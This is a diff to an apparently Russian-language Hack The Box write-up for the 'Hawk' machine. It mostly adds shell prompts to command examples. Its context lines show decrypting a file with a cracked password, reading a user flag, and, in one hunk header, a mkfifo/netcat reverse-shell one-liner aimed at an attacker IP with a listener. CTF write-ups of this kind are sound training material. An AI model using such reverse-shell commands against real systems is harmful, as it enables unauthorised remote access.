@@ -369,7 +369,7 @@ Password candidate: friends
 
 Получаем предполагаемый пароль `friends` и расшифровываем им сообщение:
 ```text
-openssl enc -d -aes256 -in .drupal.enc -k friends
+root@kali:~# openssl enc -d -aes256 -in .drupal.enc -k friends
 *** WARNING : deprecated key derivation used.
 Using -iter or -pbkdf2 would be better.
 Daniel,
@@ -459,13 +459,13 @@ Linux hawk 4.15.0-23-generic #25-Ubuntu SMP Wed May 23 18:02:16 UTC 2018 x86_64 
 
 Сразу читаем флаг юзера, т. к. он доступен всем на чтение:
 ```text
-www-data@hawk:/home/daniel$ ls -l /home/daniel/user.txt
+www-data@hawk:/home/daniel$ ls -l user.txt
 -rw-r--r-- 1 daniel daniel 33 Jun 16 22:30 /home/daniel/user.txt
 ```
 
 ## user.txt
 ```text
-www-data@hawk:/home/daniel$ cat /home/daniel/user.txt
+www-data@hawk:/home/daniel$ cat user.txt
 d5111d4f75370ebd01cdba5b32e202a8
 ```
 
@@ -570,7 +570,7 @@ daniel@hawk:~$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10
 [![hawk-port8082-browser-5.png]({{ "/img/htb/boxes/hawk/hawk-port8082-browser-5.png" | relative_url }})]({{ "/img/htb/boxes/hawk/hawk-port8082-browser-5.png" | relative_url }})
 
 ```text
-nc -lvnp 8881
+root@kali:~# nc -lvnp 8881
 Ncat: Version 7.70 ( https://nmap.org/ncat )
 Ncat: Listening on :::8881
 Ncat: Listening on 0.0.0.0:8881
